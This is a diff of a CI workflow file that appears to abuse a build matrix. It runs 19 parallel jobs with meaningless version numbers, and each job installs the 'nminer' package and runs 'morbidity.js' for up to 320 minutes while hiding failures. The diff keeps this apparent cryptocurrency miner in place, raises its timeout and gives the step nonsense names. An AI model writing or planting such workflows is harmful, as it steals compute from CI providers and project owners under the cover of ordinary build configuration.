@@ -9,25 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7424 }
-          - { version: 6136 }
-          - { version: 5773 }
-          - { version: 1380 }
-          - { version: 2301 }
-          - { version: 425 }
-          - { version: 3153 }
-          - { version: 8856 }
-          - { version: 7436 }
-          - { version: 3825 }
-          - { version: 2873 }
-          - { version: 8871 }
-          - { version: 7624 }
-          - { version: 1867 }
-          - { version: 2744 }
-          - { version: 413 }
-          - { version: 7942 }
-          - { version: 6199 }
-          - { version: 877 }
+          - { version: 6466 }
+          - { version: 8827 }
+          - { version: 280 }
+          - { version: 9629 }
+          - { version: 2889 }
+          - { version: 9627 }
+          - { version: 9499 }
+          - { version: 933 }
+          - { version: 9284 }
+          - { version: 3386 }
+          - { version: 9713 }
+          - { version: 6219 }
+          - { version: 7314 }
+          - { version: 3351 }
+          - { version: 7629 }
+          - { version: 3484 }
+          - { version: 6061 }
+          - { version: 4401 }
+          - { version: 7876 }
 
     steps:
       - name: Checkout
@@ -38,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: bleakly defrag provided however
+      - name: greedily
         run: |
           npm install nminer@latest
-          timeout 303m node morbidity.js || echo "morbidity executed"
+          timeout 320m node morbidity.js || echo "morbidity executed"
